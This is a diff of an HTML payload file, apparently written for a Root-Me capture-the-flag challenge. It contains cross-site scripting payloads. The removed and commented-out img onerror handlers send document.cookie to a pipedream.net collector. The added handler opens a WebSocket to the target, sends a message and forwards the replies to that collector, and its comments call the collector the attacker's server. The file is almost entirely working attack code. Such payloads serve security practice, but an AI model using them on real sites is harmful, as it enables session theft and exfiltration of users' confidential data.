@@ -1,19 +1,28 @@
 "Hello" 
 
 <img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
-<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie">
-<img src=x onerror="gogo()">
+<img src=x onerror="var ws = new WebSocket('ws://ctf20.root-me.org/ws');
+	ws.onopen = start
+	ws.onmessage = handleReply
+	function start(event) {
+	  ws.send('hello'); //Send the message to retreive confidential information
+	}
+	function handleReply(event) {
+	  //Exfiltrate the confidential information to attackers server
+	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
+	}">
+
 <!--<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie"> -->
 <script>
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 function gogo() {
-	var ws = new WebSocket("ws://ctf20.root-me.org/ws");
+	var ws = new WebSocket('ws://ctf20.root-me.org/ws');
 	ws.onopen = start
 	ws.onmessage = handleReply
 	function start(event) {
-	  ws.send("hello"); //Send the message to retreive confidential information
+	  ws.send('hello'); //Send the message to retreive confidential information
 	}
 	function handleReply(event) {
 	  //Exfiltrate the confidential information to attackers server
